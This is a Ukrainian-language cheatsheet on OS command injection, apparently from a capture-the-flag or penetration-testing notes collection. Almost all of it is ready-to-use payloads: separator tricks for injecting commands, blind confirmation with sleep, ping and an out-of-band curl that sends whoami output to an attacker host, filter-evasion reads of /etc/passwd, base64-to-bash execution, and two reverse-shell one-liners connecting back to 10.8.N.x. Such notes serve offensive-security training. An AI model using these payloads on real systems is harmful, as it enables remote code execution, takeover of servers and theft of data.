# Cheatsheet: Command Injection

Виконання ОС-команд через поле вводу (ping, lookup, конвертери, `?cmd=`). ← [web-enum](../02-workflows/web-enum.md) · [revshells](webshells-revshells.md)

## Роздільники (впихнути свою команду)
```
; id              # послідовно
| id              # пайп
|| id             # якщо перша впала
&& id             # якщо перша успішна
& id              # фон
$(id)             # підстановка
`id`              # підстановка (backticks)
%0a id            # newline (URL-encoded)
```
Приклад у формі ping: `127.0.0.1; id` або `127.0.0.1 && id`.

## Підтвердження (blind)
```
; sleep 5                 # відповідь затрималась на 5с → вразливо
; ping -c3 10.8.N.x       # ICMP ловиться локально: sudo tcpdump -i <vpn> icmp
; curl http://10.8.N.x:8000/$(whoami)   # OOB: видно в лозі локального http.server
```

## Обхід фільтрів
```
# пробіли заборонені:
cat${IFS}/etc/passwd
{cat,/etc/passwd}
cat</etc/passwd
# ключові слова фільтруються:
c''at /etc/passwd ;  c\at /etc/passwd ;  /???/c?t /etc/passwd
# кодування:
echo 'aWQ=' | base64 -d | bash
```

## Зразу в reverse shell
```
; bash -c 'bash -i >& /dev/tcp/10.8.N.x/4444 0>&1'
; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.8.N.x 4444 >/tmp/f
```
Listener: `nc -lvnp 4444` → [netcat](netcat-socat.md). Повні payload-и: [revshells](webshells-revshells.md).

## URL-encoding (через curl)
```bash
curl -G --data-urlencode 'ip=127.0.0.1; id' http://$TARGET/ping
curl "http://$TARGET/ping?ip=127.0.0.1%3Bid"
```

## Читання/пастки
- Вивід `uid=...` у відповіді → RCE підтверджено.
- Blind (нема виводу) → sleep/ping/curl для підтвердження, потім reverse shell.
- Одразу пошук флагів через RCE:
  `; grep -raoHE 'b[-_.]*e[-_.]*s[-_.]*t[-_.]*C[-_.]*T[-_.]*F[-_.]*\{[[:alnum:]_]+\}:[A-Za-z0-9]+' / 2>/dev/null`
